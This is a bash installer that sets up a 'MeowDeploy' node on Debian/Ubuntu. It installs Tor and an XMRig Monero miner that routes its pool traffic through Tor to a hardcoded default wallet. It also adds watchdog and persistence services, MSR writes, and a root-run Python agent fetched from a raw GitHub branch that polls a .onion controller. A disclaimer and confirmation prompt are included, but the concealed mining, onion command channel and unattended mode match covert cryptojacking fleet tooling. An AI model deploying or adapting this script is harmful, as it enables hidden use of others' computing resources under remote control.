#!/usr/bin/env bash
# Self-contained MeowDeploy node installer. Debian/Ubuntu x86_64, root required.
# Only run this on hosts you own or are explicitly authorized to administer.
set -Eeuo pipefail
umask 077

INSTALLER_VERSION="2026.11.16.5"
CONTROLLER=${MEOWDEPLOY_CONTROLLER:-}
TOKEN=${MEOWDEPLOY_TOKEN:-}
AGENT_ID=${MEOWDEPLOY_AGENT_ID:-$(hostname -s 2>/dev/null || hostname)}
CPU_PERCENT=${MEOWDEPLOY_CPU_PERCENT:-50}
POOL=${MEOWDEPLOY_POOL:-gulf.moneroocean.stream:10001}
WALLET=${MEOWDEPLOY_WALLET:-47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG}
VER=${MEOWDEPLOY_MINER_VERSION:-6.26.0}
BASE=/opt/meowdeploy
CONF=/etc/meowdeploy
STATE=/var/lib/meowdeploy
AGENT_ONLY=0
MEOW_MODE=0
MEOW_EASY=0
ASSUME_YES=0
DRY_RUN=0

usage() {
  cat <<'EOF'
MeowDeploy node installer

Usage:
  install-node.sh --controller http://HOST.onion:18765 --token TOKEN [options]

Required (or set MEOWDEPLOY_CONTROLLER / MEOWDEPLOY_TOKEN):
  --controller URL       Controller onion URL, including port
  --token TOKEN          Shared HMAC token (minimum 32 characters)

Options:
  --agent-id ID          Agent id shown by the controller (default: hostname -s)
  --cpu-percent N        CPU quota ceiling, 1-100 (default: 50)
  --meow                 Full Tor + XMRig + agent installation
  --meow-easy            Tor + XMRig mining only; no controller/dashboard
  --agent-only           Install the agent and Tor only; no miner
  --yes, -y              Non-interactive; skip the confirmation prompt
  --dry-run              Print the resolved plan and exit without changing the host
  --pool HOST:PORT       Miner pool (default: MoneroOcean)
  --wallet ADDRESS       Miner wallet (default: the project test wallet)
  --miner-version VER    XMRig release (default: 6.26.0)
  --version, -V          Print the installer version and exit
  --help, -h             Show this help

Examples:
  # Full install, interactive confirmation
  install-node.sh --controller http://abc.onion:18765 --token 'long-secret'

  # Agent-only, unattended
  install-node.sh --controller http://abc.onion:18765 --token 'long-secret' \
    --agent-only --yes
EOF
}

validate_controller_url() {
  local url=$1 scheme authority host port
  if [[ ! $url =~ ^(https?)://([^/]+)/?$ ]]; then
    echo 'Controller URL must be http://HOST:PORT (for example http://abc.onion:18765).' >&2
    return 2
  fi
  scheme=${BASH_REMATCH[1]}
  authority=${BASH_REMATCH[2]}
  if [[ $authority == *@* ]]; then
    echo 'Controller URL must not contain credentials.' >&2
    return 2
  fi
  if [[ ! $authority =~ ^([A-Za-z0-9][A-Za-z0-9.-]*):([0-9]+)$ ]]; then
    echo 'Controller URL must include an explicit numeric port, for example http://abc.onion:18765.' >&2
    return 2
  fi
  host=${BASH_REMATCH[1]}
  port=${BASH_REMATCH[2]}
  if (( ${#port} > 5 )) || (( 10#$port < 1 || 10#$port > 65535 )); then
    echo "Controller port must be between 1 and 65535 (got ${port})." >&2
    return 2
  fi
  if [[ $scheme != http && $scheme != https ]]; then
    echo 'Controller URL must use http:// or https://.' >&2
    return 2
  fi
  if [[ $host != *.onion && $host != localhost && $host != 127.0.0.1 ]]; then
    echo "Warning: controller host '$host' is not a .onion address; use it only for local testing." >&2
  fi
  return 0
}

while (($#)); do
  case "$1" in
    --controller) CONTROLLER=${2:?}; shift 2 ;;
    --token) TOKEN=${2:?}; shift 2 ;;
    --agent-id) AGENT_ID=${2:?}; shift 2 ;;
    --cpu-percent) CPU_PERCENT=${2:?}; shift 2 ;;
    --agent-only) AGENT_ONLY=1; MEOW_MODE=0; MEOW_EASY=0; shift ;;
    --meow) MEOW_MODE=1; AGENT_ONLY=0; MEOW_EASY=0; shift ;;
    --meow-easy) MEOW_EASY=1; MEOW_MODE=0; AGENT_ONLY=0; shift ;;
    --yes|-y) ASSUME_YES=1; shift ;;
    --dry-run) DRY_RUN=1; shift ;;
    --pool) POOL=${2:?}; shift 2 ;;
    --wallet) WALLET=${2:?}; shift 2 ;;
    --miner-version) VER=${2:?}; shift 2 ;;
    --version|-V) echo "MeowDeploy node installer $INSTALLER_VERSION"; exit 0 ;;
    --help|-h) usage; exit 0 ;;
    *) echo "Unknown option: $1" >&2; usage >&2; exit 2 ;;
  esac
done

if [[ $AGENT_ONLY -eq 0 && $MEOW_MODE -eq 0 && $MEOW_EASY -eq 0 && -r /dev/tty ]]; then
  printf "\nChoose installation mode:\n  1) MEOW — Tor + XMRig + agent\n  2) MEOW EASY — Tor + XMRig only\n  3) Agent only — Tor + agent\n" > /dev/tty
  read -r -p "Select [1/2/3]: " install_mode < /dev/tty
  case "$install_mode" in 1) MEOW_MODE=1 ;; 2) MEOW_EASY=1 ;; 3) AGENT_ONLY=1 ;; *) echo "Invalid selection; cancelled." >&2; exit 2 ;; esac
fi
if [[ $AGENT_ONLY -eq 0 && $MEOW_MODE -eq 0 && $MEOW_EASY -eq 0 ]]; then
  echo "Select --meow, --meow-easy or --agent-only when running non-interactively." >&2
  exit 2
fi
if [[ $MEOW_EASY -eq 0 ]]; then
  validate_controller_url "$CONTROLLER" || exit 2
  [[ -n $TOKEN && ${#TOKEN} -ge 32 && ${#TOKEN} -le 256 ]] || {
    echo 'Supply the controller token (32-256 characters).' >&2
    exit 2
  }
fi
if [[ $MEOW_EASY -eq 0 ]]; then
[[ $AGENT_ID =~ ^[A-Za-z0-9_.:-]{1,128}$ ]] || {
  echo 'Agent id must be 1-128 characters from A-Z, a-z, 0-9, _, ., :, -.' >&2
  exit 2
}
fi
[[ $CPU_PERCENT =~ ^([1-9][0-9]?|100)$ ]] || {
  echo 'CPU percentage must be 1-100.' >&2
  exit 2
}
[[ $AGENT_ONLY -eq 1 || ( -n $POOL && -n $WALLET ) ]] || {
  echo 'Pool and wallet are required for a full install.' >&2
  exit 2
}
cores=$(nproc)
cpu_quota=$((CPU_PERCENT * cores))
mode='MEOW'
[[ $MEOW_EASY -eq 1 ]] && mode='MEOW EASY'
[[ $AGENT_ONLY -eq 1 ]] && mode='agent-only'

if (( DRY_RUN )); then
  cat <<EOF
MeowDeploy dry run (no changes will be made)
  Installer:   $INSTALLER_VERSION
  Host:        $(hostname -f 2>/dev/null || hostname)
  Mode:        $mode
  CPU cap:     ${CPU_PERCENT}% of ${cores} cores (CPUQuota=${cpu_quota}%)
EOF
  if [[ $MEOW_MODE -eq 1 || $MEOW_EASY -eq 1 ]]; then
    cat <<EOF
  Pool:        $POOL
  Wallet:      $WALLET
  Miner:       XMRig $VER
EOF
  fi
  exit 0
fi

[[ $EUID == 0 ]] || { echo 'Run as root.' >&2; exit 1; }
[[ $(uname -m) == x86_64 ]] || { echo 'Only x86_64 is supported.' >&2; exit 1; }
command -v apt-get >/dev/null || { echo 'Debian/Ubuntu apt is required.' >&2; exit 1; }

if (( ! ASSUME_YES )); then
  cat <<EOF
MeowDeploy host setup
  Installer:   $INSTALLER_VERSION
  Host:        $(hostname -f 2>/dev/null || hostname)
  Mode:        $mode
  CPU cap:     ${CPU_PERCENT}% of ${cores} cores (CPUQuota=${cpu_quota}%)
EOF
  if [[ $MEOW_MODE -eq 1 || $MEOW_EASY -eq 1 ]]; then
    cat <<EOF
  Pool:        $POOL
  Wallet:      $WALLET
  Miner:       XMRig $VER
EOF
  fi
  if [[ -r /dev/tty ]]; then
    # The one-line install pipes the script into bash, so stdin is not the
    # terminal. Prompt on /dev/tty so the confirmation still works.
    read -r -p "Type 'install' to continue: " answer < /dev/tty
  else
    echo 'No terminal available: pass --yes to confirm this exact configuration.' >&2
    exit 2
  fi
  [[ $answer == install ]] || { echo 'Cancelled.'; exit 1; }
fi

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq >/dev/null
apt-get install -y -qq tor python3 python3-venv curl ca-certificates tar gzip jq iproute2 >/dev/null
for command_name in curl jq ss systemctl systemd-analyze python3; do
  command -v "$command_name" >/dev/null || { echo "Required command is missing: $command_name" >&2; exit 1; }
done
install -d -m 750 "$BASE" "$CONF" "$STATE"
# The agent writes this drop-in while ProtectSystem=full keeps /etc read-only.
install -d -m 755 /etc/systemd/system/meowdeploy-miner.service.d

# Preserve existing Tor configuration and ensure the exact SOCKS port MeowDeploy uses.
touch /etc/tor/torrc
if ! grep -Eq '^[[:space:]]*SocksPort[[:space:]]+127\.0\.0\.1:9050([[:space:]]|$)' /etc/tor/torrc; then
  printf '\n# MeowDeploy local outbound proxy\nSocksPort 127.0.0.1:9050\n' >> /etc/tor/torrc
fi
TOR_UNIT=tor.service
if systemctl cat tor@default.service >/dev/null 2>&1; then TOR_UNIT=tor@default.service; fi
systemctl enable "$TOR_UNIT" >/dev/null
systemctl restart "$TOR_UNIT" || { echo "Failed to restart $TOR_UNIT." >&2; exit 1; }

tor_listening() {
  ss -ltn 2>/dev/null | grep -Eq '127\.0\.0\.1:9050([[:space:]]|$)'
}
for _ in $(seq 1 60); do
  tor_listening && break
  sleep 1
done
if ! tor_listening; then
  echo 'Tor SOCKS listener 127.0.0.1:9050 is not listening. Check /etc/tor/torrc and journalctl -u tor.' >&2
  systemctl status tor --no-pager -l >&2 || true
  exit 1
fi

# Check Tor connectivity through SOCKS, including remote DNS resolution.
cat > /usr/local/sbin/meowdeploy-tor-check <<'EOF'
#!/usr/bin/env bash
set -eu
curl -fsS --socks5-hostname 127.0.0.1:9050 --connect-timeout 10 --max-time 20 https://check.torproject.org/api/ip | jq -e '.IsTor == true' >/dev/null
EOF
chmod 755 /usr/local/sbin/meowdeploy-tor-check
cat > /usr/local/sbin/meowdeploy-tor-guard <<'EOF'
#!/usr/bin/env bash
set -u
TOR_UNIT=$(cat /etc/meowdeploy/tor-unit)
while sleep 30; do
  /usr/local/sbin/meowdeploy-tor-check && continue
  was_running=0
  if systemctl is-active --quiet meowdeploy-miner.service; then was_running=1; systemctl stop meowdeploy-miner.service >/dev/null 2>&1 || true; fi
  systemctl restart "$TOR_UNIT" >/dev/null 2>&1 || true
  recovered=0
  for delay in 5 10 20 30 30 30; do
    sleep "$delay"
    if /usr/local/sbin/meowdeploy-tor-check; then recovered=1; break; fi
    systemctl restart "$TOR_UNIT" >/dev/null 2>&1 || true
  done
  if [[ $recovered -eq 1 && $was_running -eq 1 ]]; then systemctl start meowdeploy-miner.service >/dev/null 2>&1 || true; fi
done
EOF
chmod 755 /usr/local/sbin/meowdeploy-tor-guard
printf "%s\n" "$TOR_UNIT" > "$CONF/tor-unit"
chmod 600 "$CONF/tor-unit"
cat > /etc/systemd/system/meowdeploy-tor-guard.service <<EOF
[Unit]
Description=MeowDeploy Tor connectivity recovery watchdog
After=network-online.target $TOR_UNIT
Wants=network-online.target $TOR_UNIT
[Service]
Type=simple
ExecStart=/usr/local/sbin/meowdeploy-tor-guard
Restart=always
RestartSec=10
Nice=10
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
StandardOutput=journal
StandardError=journal
SyslogIdentifier=meowdeploy-tor-guard
[Install]
WantedBy=multi-user.target
EOF
systemd-analyze verify /etc/systemd/system/meowdeploy-tor-guard.service

if [[ $MEOW_MODE -eq 1 || $MEOW_EASY -eq 1 ]]; then
  # Preserve existing MeowDeploy miner state before replacing it.
backup_dir="$STATE/backups/$(date -u +%Y%m%dT%H%M%SZ)"
install -d -m 700 "$backup_dir"
if systemctl is-active --quiet meowdeploy-miner.service 2>/dev/null; then
  systemctl stop meowdeploy-miner.service
fi
for existing in "$BASE/xmrig" "$CONF/miner.json" /etc/systemd/system/meowdeploy-miner.service; do
  if [[ -e $existing ]]; then cp -a --parents "$existing" "$backup_dir/"; fi
done
# Retry metadata and archive downloads, verify the official release digest each time.
  tmp=$(mktemp -d)
  trap 'rm -rf "$tmp"' EXIT
  asset="https://github.com/xmrig/xmrig/releases/download/v${VER}/xmrig-${VER}-linux-static-x64.tar.gz"
  api="https://api.github.com/repos/xmrig/xmrig/releases/tags/v${VER}"
  ok=0
  for _attempt in 1 2 3; do
    rm -f "$tmp/release.json" "$tmp/xmrig.tar.gz"
    if curl -fsSL --retry 2 --connect-timeout 15 "$api" -o "$tmp/release.json" && \
       digest=$(jq -r --arg n "xmrig-${VER}-linux-static-x64.tar.gz" '.assets[]|select(.name==$n)|.digest|sub("^sha256:";"")' "$tmp/release.json") && \
       [[ $digest =~ ^[a-fA-F0-9]{64}$ ]] && \
       curl -fsSL --retry 2 --connect-timeout 15 "$asset" -o "$tmp/xmrig.tar.gz" && \
       printf '%s  %s\n' "$digest" "$tmp/xmrig.tar.gz" | sha256sum -c --status; then
      ok=1
      break
    fi
  done
  ((ok)) || { echo 'XMRig download or digest verification failed after 3 attempts.' >&2; exit 1; }
  tar -tzf "$tmp/xmrig.tar.gz" >/dev/null
  tar -xzf "$tmp/xmrig.tar.gz" -C "$tmp"
  bin=$(find "$tmp" -type f -name xmrig -perm /111 -print -quit)
  [[ -n $bin ]] || { echo 'Verified archive did not contain executable xmrig.' >&2; exit 1; }
  install -m 755 "$bin" "$BASE/xmrig.new"
  "$BASE/xmrig.new" --version >/dev/null
  mv -f "$BASE/xmrig.new" "$BASE/xmrig"

  rig=$( (hostname -s 2>/dev/null || hostname) | tr -cd 'A-Za-z0-9_.-')
  [[ -n $rig ]] || rig=meowdeploy
  gb_pages=false
  [[ -d /sys/kernel/mm/hugepages/hugepages-1048576kB ]] && gb_pages=true

  jq -n \
    --arg pool "$POOL" \
    --arg wallet "$WALLET" \
    --arg rig "$rig" \
    --argjson gb_pages "$gb_pages" \
    '{autosave:false,background:false,colors:false,
      randomx:{init:-1,mode:"auto", "1gb-pages":$gb_pages,rdmsr:true,wrmsr:true,numa:true},
      cpu:{enabled:true,"huge-pages":true,"huge-pages-jit":true,priority:1,yield:true,asm:true},
      http:{enabled:true,host:"127.0.0.1",port:18088,"access-token":null,restricted:true},
      opencl:{enabled:false},cuda:{enabled:false},
      pools:[{url:$pool,user:$wallet,pass:$rig,"rig-id":$rig,keepalive:true,tls:false,socks5:"127.0.0.1:9050"}]}' \
    > "$CONF/miner.json.tmp"
  jq -e '.pools[0].url and .pools[0].user and .http.enabled and .http.host=="127.0.0.1"' "$CONF/miner.json.tmp" >/dev/null
  chmod 600 "$CONF/miner.json.tmp"
  mv "$CONF/miner.json.tmp" "$CONF/miner.json"

  cat > "$CONF/hugepages" <<'EOF'
#!/bin/sh
set -eu
hp=/sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages
if [ -w "$hp" ]; then
  avail=$(awk '/MemAvailable:/ {print int($2/1024)}' /proc/meminfo)
  pages=$(((avail-1024)/2))
  [ "$pages" -lt 0 ] && pages=0
  [ "$pages" -gt 1600 ] && pages=1600
  echo "$pages" > "$hp" 2>/dev/null || true
fi
EOF
  chmod 755 "$CONF/hugepages"

  # MSR is an optimization only; do not fail or weaken other kernel protections.
  modprobe msr 2>/dev/null || true
  if [[ -w /sys/module/msr/parameters/allow_writes ]]; then
    echo 1 > /sys/module/msr/parameters/allow_writes 2>/dev/null || true
  fi

  cat > /etc/systemd/system/meowdeploy-miner.service <<EOF
[Unit]
Description=MeowDeploy XMRig workload
After=network-online.target $TOR_UNIT
Wants=network-online.target $TOR_UNIT
[Service]
Type=simple
ExecStartPre=/usr/local/sbin/meowdeploy-tor-check
ExecStartPre=$CONF/hugepages
ExecStart=$BASE/xmrig --config=$CONF/miner.json
Restart=always
RestartSec=20
Nice=10
CPUQuota=${cpu_quota}%
CPUAccounting=true
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$CONF /sys/kernel/mm/hugepages
StandardOutput=journal
StandardError=journal
LogRateLimitIntervalSec=30s
LogRateLimitBurst=5
SyslogIdentifier=meowdeploy-miner
[Install]
WantedBy=multi-user.target
EOF
  systemd-analyze verify /etc/systemd/system/meowdeploy-miner.service
fi

if [[ $MEOW_EASY -eq 0 ]]; then
SOURCE=${MEOWDEPLOY_SOURCE:-https://raw.githubusercontent.com/Catgirlmp3/meowdeploy/feature/windows-recovery-relay}
raw_url() {
  printf '%s/%s?v=%s' "${SOURCE%/}" "$1" "$INSTALLER_VERSION"
}
require_file() {
  [[ -f $1 ]] || { echo "Missing required file: $1" >&2; exit 1; }
}

curl -fsSL --retry 3 --connect-timeout 15 -H 'Cache-Control: no-cache' \
  "$(raw_url agent/meowdeploy_agent.py)" -o "$BASE/meowdeploy_agent.py.new"
curl -fsSL --retry 3 --connect-timeout 15 -H 'Cache-Control: no-cache' \
  "$(raw_url agent/requirements.txt)" -o "$BASE/requirements.txt.new"
curl -fsSL --retry 3 --connect-timeout 15 -H 'Cache-Control: no-cache' \
  "$(raw_url agent/meowdeploy-agent.service)" -o /etc/systemd/system/meowdeploy-agent.service.new
for downloaded in "$BASE/meowdeploy_agent.py.new" "$BASE/requirements.txt.new" /etc/systemd/system/meowdeploy-agent.service.new; do
  [[ -s $downloaded ]] || { echo "Downloaded file is empty: $downloaded" >&2; exit 1; }
done
install -m 755 "$BASE/meowdeploy_agent.py.new" "$BASE/meowdeploy_agent.py"
install -m 644 "$BASE/requirements.txt.new" "$BASE/requirements.txt"
install -m 644 /etc/systemd/system/meowdeploy-agent.service.new /etc/systemd/system/meowdeploy-agent.service
rm -f "$BASE/meowdeploy_agent.py.new" "$BASE/requirements.txt.new" /etc/systemd/system/meowdeploy-agent.service.new

require_file "$BASE/meowdeploy_agent.py"
require_file "$BASE/requirements.txt"
require_file /etc/systemd/system/meowdeploy-agent.service

python3 -m venv "$BASE/venv"
[[ -x $BASE/venv/bin/python3 ]] || {
  echo "Python venv is missing its interpreter: $BASE/venv/bin/python3" >&2
  exit 1
}
"$BASE/venv/bin/pip" install -q -r "$BASE/requirements.txt"
"$BASE/venv/bin/python3" "$BASE/meowdeploy_agent.py" --version >/dev/null || {
  echo 'The installed agent cannot run with the new venv.' >&2
  exit 1
}

jq -n \
  --arg controller "$CONTROLLER" \
  --arg agent_id "$AGENT_ID" \
  --arg token "$TOKEN" \
  --arg state_path "$STATE/state.json" \
  --arg miner_service meowdeploy-miner.service \
  --argjson socks_port 9050 \
  --argjson poll_seconds 30 \
  '{controller:$controller,agent_id:$agent_id,token:$token,state_path:$state_path,miner_service:$miner_service,socks_port:$socks_port,poll_seconds:$poll_seconds}' \
  > "$CONF/agent.json.tmp"
chmod 600 "$CONF/agent.json.tmp"
mv "$CONF/agent.json.tmp" "$CONF/agent.json"
require_file "$CONF/agent.json"
TOKEN_CHECK="$TOKEN" jq -e \
  --arg controller "$CONTROLLER" \
  --arg agent_id "$AGENT_ID" \
  '.controller == $controller and .agent_id == $agent_id and .token == env.TOKEN_CHECK and .socks_port == 9050 and .poll_seconds == 30' \
  "$CONF/agent.json" >/dev/null || {
    echo "Agent config verification failed: $CONF/agent.json" >&2
    exit 1
  }
config_mode=$(stat -c '%a' "$CONF/agent.json" 2>/dev/null || true)
[[ $config_mode == 600 ]] || {
  echo "Agent config must have mode 0600 (found ${config_mode:-unknown}): $CONF/agent.json" >&2
  exit 1
}

# Older installers used an agent drop-in that put --controller/--token on the
# ExecStart command line. Remove every stale ExecStart override, not just the
# known 10-config.conf path, before reloading systemd.
remove_agent_execstart_dropins() {
  local dir=/etc/systemd/system/meowdeploy-agent.service.d file
  [[ -d $dir ]] || return 0
  for file in "$dir"/*.conf; do
    [[ -e $file ]] || continue
    if grep -Eq '^[[:space:]]*ExecStart[[:space:]]*=' "$file"; then
      echo "Removing stale agent drop-in: $file" >&2
      rm -f -- "$file"
    fi
  done
  rm -f -- "$dir/10-config.conf"
  rmdir "$dir" 2>/dev/null || true
}
remove_agent_execstart_dropins

# Keep the agent's Tor dependency aligned with the unit selected above.
install -d -m 755 /etc/systemd/system/meowdeploy-agent.service.d
cat > /etc/systemd/system/meowdeploy-agent.service.d/00-tor-unit.conf <<EOF
[Unit]
After=
After=network-online.target $TOR_UNIT
Wants=
Wants=network-online.target $TOR_UNIT
EOF

systemd-analyze verify /etc/systemd/system/meowdeploy-agent.service || {
  echo 'Agent systemd unit failed validation.' >&2
  exit 1
}
fi # MEOW EASY skips all controller and agent installation
systemctl daemon-reload

failed=0
if [[ $MEOW_MODE -eq 1 || $MEOW_EASY -eq 1 ]]; then
  systemctl enable meowdeploy-tor-guard.service >/dev/null
  systemctl start meowdeploy-tor-guard.service
  tor_ready=0
  for delay in 5 10 20 30 30 30; do
    if /usr/local/sbin/meowdeploy-tor-check; then tor_ready=1; break; fi
    echo "Tor not ready; restarting $TOR_UNIT and retrying in ${delay}s." >&2
    systemctl restart "$TOR_UNIT" || true
    sleep "$delay"
  done
  [[ $tor_ready -eq 1 ]] || { echo "Tor recovery failed; refusing to start XMRig." >&2; journalctl -u "$TOR_UNIT" -n 30 --no-pager >&2 || true; exit 1; }
  if ! systemctl enable meowdeploy-miner.service >/dev/null 2>&1 || ! systemctl start meowdeploy-miner.service >/dev/null 2>&1; then
    echo 'Miner service could not be enabled/started. Diagnostics:' >&2
    systemctl status meowdeploy-miner.service --no-pager -l >&2 || true
    journalctl -u meowdeploy-miner.service -n 30 --no-pager >&2 || true
    failed=1
  fi
  if ! systemctl is-active --quiet meowdeploy-miner.service; then
    echo 'Miner service is not active. Diagnostics:' >&2
    systemctl status meowdeploy-miner.service --no-pager -l >&2 || true
    journalctl -u meowdeploy-miner.service -n 30 --no-pager >&2 || true
    failed=1
  fi
fi

if [[ $MEOW_EASY -eq 0 ]]; then
  if ! systemctl enable --now meowdeploy-agent.service >/dev/null 2>&1; then
    echo 'Agent service could not be enabled/started. Diagnostics:' >&2
    systemctl status meowdeploy-agent.service --no-pager -l >&2 || true
    journalctl -u meowdeploy-agent.service -n 30 --no-pager >&2 || true
    failed=1
  fi
  if ! systemctl is-active --quiet meowdeploy-agent.service; then
    echo 'Agent service is not active. Diagnostics:' >&2
    systemctl status meowdeploy-agent.service --no-pager -l >&2 || true
    journalctl -u meowdeploy-agent.service -n 30 --no-pager >&2 || true
    failed=1
  fi
  if ! systemctl is-enabled --quiet meowdeploy-agent.service; then
    echo 'Agent service is not enabled for startup.' >&2
    failed=1
  fi
  expected_exec="$BASE/venv/bin/python3 $BASE/meowdeploy_agent.py --config $CONF/agent.json"
  effective_exec=$(systemctl show meowdeploy-agent.service -p ExecStart --value 2>/dev/null || true)
  if [[ $effective_exec != *"$expected_exec"* ]]; then
    echo 'Agent service is not using the expected config-file ExecStart.' >&2
    echo "Expected to find: $expected_exec" >&2
    echo "Effective ExecStart: ${effective_exec:-<empty>}" >&2
    echo 'Check /etc/systemd/system/meowdeploy-agent.service and its drop-ins.' >&2
    failed=1
  fi
  if [[ -d /etc/systemd/system/meowdeploy-agent.service.d ]] && \
     grep -rEq '^[[:space:]]*ExecStart[[:space:]]*=' /etc/systemd/system/meowdeploy-agent.service.d --include='*.conf'; then
    echo 'An agent drop-in still overrides ExecStart.' >&2
    failed=1
  fi
fi
((failed == 0)) || exit 1
if ! tor_listening; then
  echo 'Tor SOCKS listener 127.0.0.1:9050 disappeared during installation.' >&2
  exit 1
fi

if [[ $MEOW_EASY -eq 1 ]]; then
  echo "MEOW EASY installed: Tor + XMRig active; installer ${INSTALLER_VERSION}; worker ${rig}; CPU cap ${CPU_PERCENT}% of ${cores} cores (CPUQuota=${cpu_quota}%); Tor and miner verified."
else
  echo "MeowDeploy installed: ${mode} active; installer ${INSTALLER_VERSION}; agent id ${AGENT_ID}; CPU cap ${CPU_PERCENT}% of ${cores} cores (CPUQuota=${cpu_quota}%); config, ExecStart, Tor, and services verified."
fi
